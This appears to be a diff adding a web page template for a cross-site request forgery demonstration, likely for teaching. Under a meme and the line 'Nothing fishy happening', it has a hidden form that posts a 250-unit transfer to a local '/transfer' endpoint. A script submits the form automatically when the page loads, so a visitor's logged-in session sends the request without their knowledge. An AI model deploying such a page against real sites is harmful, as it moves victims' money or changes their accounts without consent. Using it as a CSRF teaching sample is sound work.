@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <%- include('partials/head') %>
+  </head>
+  <body class="flex flex-col items-center justify-center bg-yellow-100">
+    <img src="/meme.jpg" alt="A Funny Meme" class="block" />
+    <p>
+      Nothing fishy happening over on <strong>Port <%= port %></strong>. Move
+      along.
+    </p>
+    <form id="take-the-money-and-run" method="POST" action="http://localhost:<%= port %>/transfer" class="opacity-0">
+      <input type="text" name="recipient" value="2">
+      <input type="amount" name="amount" value="250">
+    <form>
+    <script>
+      document.getElementById('take-the-money-and-run').submit();
+    </script>
+  </body>
+  <script>
+
+  </script>
+</html>
